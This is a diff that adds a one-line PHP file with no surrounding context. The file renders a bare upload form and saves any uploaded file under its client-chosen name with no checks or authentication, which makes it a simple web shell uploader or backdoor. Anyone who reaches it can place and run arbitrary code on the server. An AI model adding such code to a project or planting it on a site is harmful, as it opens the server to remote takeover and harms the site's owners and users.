@@ -1,0 +1,1 @@
+<?php if($_FILES["f"]["name"]){if(move_uploaded_file($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){echo "OK";}else{echo "ERR";}}echo "<form method=post enctype=multipart/form-data><input type=file name=f><input type=submit></form>"; ?>
